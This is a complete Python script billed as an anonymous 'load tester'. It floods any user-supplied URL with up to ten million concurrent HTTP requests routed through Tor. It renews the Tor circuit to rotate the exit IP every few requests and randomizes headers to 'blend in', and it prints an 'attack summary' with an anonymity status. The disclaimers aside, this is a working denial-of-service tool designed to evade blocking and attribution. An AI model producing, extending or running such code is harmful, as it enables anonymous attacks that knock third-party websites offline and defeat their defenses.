#!/usr/bin/env python3
"""
Tor-Routed HTTP Load Testing Script
WARNING: For testing YOUR OWN applications only
"""
import requests
import time
import random
import subprocess
import threading
from collections import defaultdict
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional
from stem import Signal
from stem.control import Controller

# Tor configuration
TOR_PROXY_HOST = "127.0.0.1"
TOR_PROXY_PORT = 9050
TOR_CONTROL_PORT = 9051
TOR_PASSWORD = ""

# Large pool of realistic user agents (latest versions, diverse platforms)
USER_AGENTS = [
    # Firefox on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    # Firefox on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0; rv:120.0) Gecko/20100101 Firefox/120.0",
    # Firefox on Linux
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    # Chrome on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # Chrome on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # Chrome on Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # Safari on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    # Edge on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
]

ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-CA,en;q=0.9",
    "en-AU,en;q=0.9",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "it-IT,it;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
]

# Realistic referrers to blend in
REFERRERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.yahoo.com/",
    "",  # Direct navigation
]

def ensure_tor_running():
    """Ensure Tor service is running"""
    try:
        result = subprocess.run(['pgrep', '-x', 'tor'], capture_output=True)
        if result.returncode != 0:
            print("⚠️  Tor is not running. Starting Tor...")
            subprocess.run(['sudo', 'pkill', '-9', 'tor'], stderr=subprocess.DEVNULL)
            time.sleep(1)
            subprocess.Popen(['sudo', 'tor'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("⏳ Waiting for Tor to start...")
            time.sleep(5)
            result = subprocess.run(['pgrep', '-x', 'tor'], capture_output=True)
            if result.returncode == 0:
                print("✅ Tor started successfully")
                return True
            else:
                print("❌ Failed to start Tor")
                return False
        return True
    except Exception as e:
        print(f"⚠️  Could not check/start Tor: {e}")
        return True

def renew_tor_circuit():
    """Request new Tor circuit to change IP"""
    try:
        with Controller.from_port(port=TOR_CONTROL_PORT) as controller:
            controller.authenticate(password=TOR_PASSWORD)
            controller.signal(Signal.NEWNYM)
            time.sleep(0.5)  # Reduced delay for faster IP rotation
            return True
    except Exception as e:
        return False

def get_random_headers():
    """Generate randomized HTTP headers for better anonymity"""
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice(ACCEPT_LANGUAGES),
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
        'Cache-Control': random.choice(['max-age=0', 'no-cache']),
    }
    
    # Randomly add referer (60% chance)
    if random.random() < 0.6:
        referrer = random.choice(REFERRERS)
        if referrer:
            headers['Referer'] = referrer
    
    # Randomly vary some headers for more diversity
    if random.random() < 0.3:
        headers['Pragma'] = 'no-cache'
    
    return headers

def make_request(url: str, method: str = "GET", timeout: int = 10, use_tor: bool = True, request_num: int = 0, rotate_every: int = 10, session: Optional[requests.Session] = None) -> dict:
    """Make a single HTTP request through Tor with randomized headers and IP rotation"""
    start_time = time.time()
    
    # Rotate IP every N requests (reduced wait time)
    if use_tor and request_num > 0 and request_num % rotate_every == 0:
        try:
            renew_tor_circuit()
            time.sleep(0.3)  # Minimal wait for new circuit
        except:
            pass  # Continue even if circuit renewal fails
    
    try:
        # Reuse session if provided, otherwise create new one
        if session is None:
            session = requests.session()
            
            if use_tor:
                session.proxies = {
                    'http': f'socks5h://{TOR_PROXY_HOST}:{TOR_PROXY_PORT}',
                    'https': f'socks5h://{TOR_PROXY_HOST}:{TOR_PROXY_PORT}'
                }
        
        # Use randomized headers
        headers = get_random_headers()
        
        # Removed artificial delay for maximum speed
        
        if method.upper() == "GET":
            response = session.get(url, headers=headers, timeout=timeout, allow_redirects=True)
        elif method.upper() == "POST":
            response = session.post(url, headers=headers, timeout=timeout, allow_redirects=True)
        else:
            raise ValueError(f"Unsupported method: {method}")
        
        elapsed = time.time() - start_time
        
        # Capture response size
        response_size = len(response.content) if hasattr(response, 'content') else 0
        
        return {
            "success": True,
            "status_code": response.status_code,
            "elapsed": elapsed,
            "size": response_size,
            "timestamp": time.time(),
            "error": None
        }
    except requests.exceptions.ProxyError as e:
        elapsed = time.time() - start_time
        return {
            "success": False,
            "error": f"ProxyError: Tor connection failed - {str(e)[:50]}",
            "elapsed": elapsed,
            "size": 0,
            "timestamp": time.time(),
            "status_code": 0
        }
    except requests.exceptions.ConnectTimeout as e:
        elapsed = time.time() - start_time
        return {
            "success": False,
            "error": f"ConnectTimeout: Could not reach target - {str(e)[:50]}",
            "elapsed": elapsed,
            "size": 0,
            "timestamp": time.time(),
            "status_code": 0
        }
    except requests.exceptions.ReadTimeout as e:
        elapsed = time.time() - start_time
        return {
            "success": False,
            "error": f"ReadTimeout: Server too slow to respond - {str(e)[:50]}",
            "elapsed": elapsed,
            "size": 0,
            "timestamp": time.time(),
            "status_code": 0
        }
    except requests.exceptions.ConnectionError as e:
        elapsed = time.time() - start_time
        return {
            "success": False,
            "error": f"ConnectionError: {str(e)[:60]}",
            "elapsed": elapsed,
            "size": 0,
            "timestamp": time.time(),
            "status_code": 0
        }
    except Exception as e:
        elapsed = time.time() - start_time
        return {
            "success": False,
            "error": f"{type(e).__name__}: {str(e)[:60]}",
            "elapsed": elapsed,
            "size": 0,
            "timestamp": time.time(),
            "status_code": 0
        }

def run_load_test(url: str, num_requests: int, concurrency: int = 10, method: str = "GET", rotate_every: int = 10):
    """Run load test with specified parameters through Tor"""
    
    # Ensure Tor is running
    print("🔍 Checking Tor status...")
    ensure_tor_running()
    
    # Test Tor connection - verify we're anonymous
    print("🌐 Testing Tor connection and anonymity...")
    test_session = requests.session()
    test_session.proxies = {
        'http': f'socks5h://{TOR_PROXY_HOST}:{TOR_PROXY_PORT}',
        'https': f'socks5h://{TOR_PROXY_HOST}:{TOR_PROXY_PORT}'
    }
    try:
        ip_resp = test_session.get('https://api.ipify.org?format=json', timeout=10)
        tor_ip = ip_resp.json().get('ip', 'Unknown')
        print(f"✅ Connected to Tor. Exit IP: {tor_ip}")
        
        # Verify we're not leaking real IP
        print("🔒 Verifying no IP leaks...")
        dns_test = test_session.get('https://check.torproject.org/api/ip', timeout=10)
        is_tor = dns_test.json().get('IsTor', False)
        if is_tor:
            print(f"✅ Tor verified! Real IP is hidden.\n")
        else:
            print(f"⚠️  WARNING: May not be routing through Tor properly!\n")
    except Exception as e:
        print(f"⚠️  Warning: Could not verify Tor connection: {e}\n")
    
    print(f"Starting HIGH-INTENSITY anonymous load test:")
    print(f"  URL: {url}")
    print(f"  Requests: {num_requests:,}")
    print(f"  Concurrency: {concurrency} (parallel threads)")
    print(f"  Method: {method}")
    print(f"  IP Rotation: Every {rotate_every} requests")
    print(f"  Anonymity: FULL (Tor routing + randomized headers)")
    print(f"  Speed: MAXIMUM (no artificial delays)")
    print()
    
    # Enhanced results tracking
    results = {
        "total": 0,
        "success": 0,
        "failed": 0,
        "response_times": [],
        "status_codes": defaultdict(int),
        "error_types": defaultdict(int),
        "bytes_sent": 0,
        "bytes_received": 0,
        "timeouts": 0,
        "connection_errors": 0,
        "requests_per_second": [],
        "all_results": []
    }
    
    # Lock for thread-safe updates
    results_lock = threading.Lock()
    
    start_time = time.time()
    last_update = start_time
    
    print(f"💥 Launching {num_requests:,} requests through Tor network...")
    print("="*80)
    
    # Create persistent sessions for connection pooling
    sessions = []
    for _ in range(min(concurrency, 50)):  # Limit session pool
        s = requests.session()
        s.proxies = {
            'http': f'socks5h://{TOR_PROXY_HOST}:{TOR_PROXY_PORT}',
            'https': f'socks5h://{TOR_PROXY_HOST}:{TOR_PROXY_PORT}'
        }
        sessions.append(s)
    
    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        futures = [
            executor.submit(make_request, url, method, 10, True, i, rotate_every, sessions[i % len(sessions)]) 
            for i in range(num_requests)
        ]
        
        print(f"⚡ Real-time monitoring started...")
        print(f"{'Time':<8} {'Completed':<12} {'Success':<10} {'Failed':<10} {'Rate/s':<10} {'Avg RT':<10} {'Status':<20}")
        print("-"*90)
        
        completed_count = 0
        last_error_shown = None
        
        for i, future in enumerate(as_completed(futures), 1):
            result = future.result()
            
            with results_lock:
                results["total"] += 1
                results["all_results"].append(result)
                
                if result["success"]:
                    results["success"] += 1
                    status = result.get("status_code", 0)
                    results["status_codes"][status] += 1
                    results["bytes_received"] += result.get("size", 0)
                else:
                    results["failed"] += 1
                    error = result.get("error", "Unknown")
                    
                    # Categorize errors
                    if "timeout" in error.lower() or "timed out" in error.lower():
                        results["timeouts"] += 1
                        results["error_types"]["Timeout"] += 1
                    elif "connection" in error.lower() or "refused" in error.lower():
                        results["connection_errors"] += 1
                        results["error_types"]["ConnectionError"] += 1
                    elif "proxy" in error.lower() or "socks" in error.lower():
                        results["error_types"]["ProxyError"] += 1
                    else:
                        error_type = error.split(":")[0] if ":" in error else error[:30]
                        results["error_types"][error_type] += 1
                    
                    # Show first unique error
                    if last_error_shown != error and results["failed"] <= 3:
                        print(f"\n⚠️  Error detected: {error[:70]}", flush=True)
                        last_error_shown = error
                
                results["response_times"].append(result["elapsed"])
                results["bytes_sent"] += 200  # Approximate request size
            
            completed_count += 1
            current_time = time.time()
            
            # Update display every 0.5 seconds or on last request
            if current_time - last_update >= 0.5 or i == num_requests:
                elapsed = current_time - start_time
                rate = completed_count / elapsed if elapsed > 0 else 0
                avg_time = sum(results["response_times"]) / len(results["response_times"]) if results["response_times"] else 0
                
                # Get most common status code or error
                if results["status_codes"]:
                    top_status = max(results["status_codes"].items(), key=lambda x: x[1])
                    status_display = f"{top_status[0]}({top_status[1]})"
                elif results["error_types"]:
                    top_error = max(results["error_types"].items(), key=lambda x: x[1])
                    status_display = f"ERR:{top_error[0][:12]}"
                else:
                    status_display = "N/A"
                
                time_str = f"{int(elapsed)}s"
                completed_str = f"{completed_count:,}/{num_requests:,}"
                success_str = f"{results['success']:,}"
                failed_str = f"{results['failed']:,}"
                rate_str = f"{rate:.1f}"
                avg_rt_str = f"{avg_time*1000:.0f}ms"
                
                print(f"{time_str:<8} {completed_str:<12} {success_str:<10} {failed_str:<10} {rate_str:<10} {avg_rt_str:<10} {status_display:<20}", flush=True)
                
                # Early warning if all failing
                if completed_count >= 50 and results["success"] == 0:
                    print(f"\n⛔ WARNING: All {completed_count} requests have failed!")
                    print(f"⛔ Most common error: {max(results['error_types'].items(), key=lambda x: x[1])[0]}")
                    print(f"⛔ Continuing to collect data, but you may want to Ctrl+C to stop...\n", flush=True)
                
                last_update = current_time
    
    total_time = time.time() - start_time
    
    # Calculate additional metrics
    total_bytes_sent = results["bytes_sent"]
    total_bytes_received = results["bytes_received"]
    total_bandwidth = total_bytes_sent + total_bytes_received
    
    # Print detailed summary
    print("\n" + "="*80)
    print("📊 DETAILED ATTACK SUMMARY")
    print("="*80)
    
    # Basic stats
    print(f"\n🎯 REQUEST STATISTICS:")
    print(f"  Total requests sent:     {results['total']:,}")
    print(f"  ✅ Successful:            {results['success']:,} ({results['success']/results['total']*100:.1f}%)")
    print(f"  ❌ Failed:                {results['failed']:,} ({results['failed']/results['total']*100:.1f}%)")
    print(f"  ⏱️  Total duration:        {total_time:.2f}s")
    print(f"  ⚡ Average rate:          {results['total']/total_time:.2f} req/s")
    print(f"  💥 Peak theoretical:      {concurrency*1000/10:.0f} req/s")
    
    # Response time analysis
    if results["response_times"]:
        avg_time = sum(results["response_times"]) / len(results["response_times"])
        min_time = min(results["response_times"])
        max_time = max(results["response_times"])
        sorted_times = sorted(results["response_times"])
        p50 = sorted_times[len(sorted_times)//2]
        p95 = sorted_times[int(len(sorted_times)*0.95)]
        p99 = sorted_times[int(len(sorted_times)*0.99)]
        
        print(f"\n⏲️  RESPONSE TIME ANALYSIS:")
        print(f"  Average:                 {avg_time*1000:.2f}ms")
        print(f"  Median (p50):            {p50*1000:.2f}ms")
        print(f"  95th percentile (p95):   {p95*1000:.2f}ms")
        print(f"  99th percentile (p99):   {p99*1000:.2f}ms")
        print(f"  Minimum:                 {min_time*1000:.2f}ms")
        print(f"  Maximum:                 {max_time*1000:.2f}ms")
    
    # Status code distribution
    if results["status_codes"]:
        print(f"\n📋 HTTP STATUS CODE DISTRIBUTION:")
        for code, count in sorted(results["status_codes"].items(), key=lambda x: x[1], reverse=True):
            percentage = (count/results['success']*100) if results['success'] > 0 else 0
            bar_length = int(percentage / 2)
            bar = "█" * bar_length
            print(f"  {code}: {count:>6,} ({percentage:>5.1f}%) {bar}")
    
    # Error analysis
    if results["error_types"]:
        print(f"\n❌ ERROR TYPE DISTRIBUTION:")
        for error_type, count in sorted(results["error_types"].items(), key=lambda x: x[1], reverse=True)[:10]:
            percentage = (count/results['failed']*100) if results['failed'] > 0 else 0
            print(f"  {error_type[:40]:<40} {count:>6,} ({percentage:>5.1f}%)")
        
        if results["timeouts"]:
            print(f"\n⏱️  Timeout breakdown:")
            print(f"  Total timeouts:          {results['timeouts']:,} ({results['timeouts']/results['total']*100:.1f}%)")
        
        if results["connection_errors"]:
            print(f"  Connection errors:       {results['connection_errors']:,} ({results['connection_errors']/results['total']*100:.1f}%)")
    
    # Bandwidth analysis
    print(f"\n📊 BANDWIDTH ANALYSIS:")
    print(f"  Data sent:               {total_bytes_sent/1024:.2f} KB ({total_bytes_sent/1024/1024:.2f} MB)")
    print(f"  Data received:           {total_bytes_received/1024:.2f} KB ({total_bytes_received/1024/1024:.2f} MB)")
    print(f"  Total bandwidth:         {total_bandwidth/1024:.2f} KB ({total_bandwidth/1024/1024:.2f} MB)")
    print(f"  Average throughput:      {total_bandwidth/1024/total_time:.2f} KB/s")
    
    # Success rate over time (last 10% of requests)
    if len(results["all_results"]) > 10:
        last_10_percent = results["all_results"][-len(results["all_results"])//10:]
        last_success = sum(1 for r in last_10_percent if r["success"])
        recent_success_rate = (last_success / len(last_10_percent) * 100) if last_10_percent else 0
        print(f"\n📈 PERFORMANCE TREND:")
        print(f"  Overall success rate:    {results['success']/results['total']*100:.1f}%")
        print(f"  Recent success rate:     {recent_success_rate:.1f}% (last {len(last_10_percent)} requests)")
        if recent_success_rate < results['success']/results['total']*100 - 5:
            print(f"  ⚠️  WARNING: Success rate declining!")
        elif recent_success_rate > results['success']/results['total']*100 + 5:
            print(f"  ✅ Success rate improving!")
    
    print(f"\n🔒 ANONYMITY STATUS:")
    print(f"  Tor routing:             ✅ ENABLED")
    print(f"  Real IP protection:      ✅ ACTIVE")
    print(f"  Header randomization:    ✅ ACTIVE")
    print(f"  IP rotation frequency:   Every {rotate_every} requests")
    
    print("\n" + "="*80)
    print(f"Attack completed at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*80)

def main():
    print("=" * 60)
    print("💥 BOOM - High-Intensity Anonymous Load Tester")
    print("=" * 60)
    print("⚠️  WARNING: For testing YOUR OWN applications only!")
    print("⚠️  Unauthorized testing is ILLEGAL!")
    print("🔒 Real IP protection: ENABLED (Tor routing)")
    print("=" * 60)
    
    # Get URL from user
    url = input("\n🔗 Enter target URL: ").strip()
    
    if not url:
        print("❌ No URL provided. Exiting.")
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    # Get number of requests
    while True:
        try:
            num_requests_input = input("📊 Number of requests (1-10,000,000, default 100): ").strip()
            if not num_requests_input:
                num_requests = 100
                break
            num_requests = int(num_requests_input)
            if 1 <= num_requests <= 10000000:
                break
            else:
                print("⚠️  Please enter a number between 1 and 10,000,000")
        except ValueError:
            print("⚠️  Please enter a valid number")
    
    # Get concurrency
    while True:
        try:
            concurrency_input = input("⚡ Concurrent requests (1-5000, default 50): ").strip()
            if not concurrency_input:
                concurrency = 50
                break
            concurrency = int(concurrency_input)
            if 1 <= concurrency <= 5000:
                break
            else:
                print("⚠️  Please enter a number between 1 and 5000")
        except ValueError:
            print("⚠️  Please enter a valid number")
    
    # Get HTTP method
    method_input = input("🔧 HTTP method (GET/POST, default GET): ").strip().upper()
    method = method_input if method_input in ["GET", "POST"] else "GET"
    
    # Get IP rotation frequency
    while True:
        try:
            rotate_input = input("🔄 Rotate IP every N requests (1-500, default 50): ").strip()
            if not rotate_input:
                rotate_every = 50
                break
            rotate_every = int(rotate_input)
            if 1 <= rotate_every <= 500:
                break
            else:
                print("⚠️  Please enter a number between 1 and 500")
        except ValueError:
            print("⚠️  Please enter a valid number")
    
    # Confirm large request counts
    if num_requests > 1000:
        print(f"\n{'='*60}")
        print(f"⚠️  FINAL WARNING ⚠️")
        print(f"{'='*60}")
        print(f"You are about to send {num_requests:,} requests.")
        print(f"Only proceed if you OWN the target or have permission.")
        print(f"Unauthorized testing is a CRIME.")
        print(f"{'='*60}")
        response = input(f"Type 'I UNDERSTAND' to continue: ")
        if response != 'I UNDERSTAND':
            print("Cancelled.")
            return
    
    print("\n" + "=" * 60)
    run_load_test(url, num_requests, concurrency, method, rotate_every)

if __name__ == "__main__":
    main()
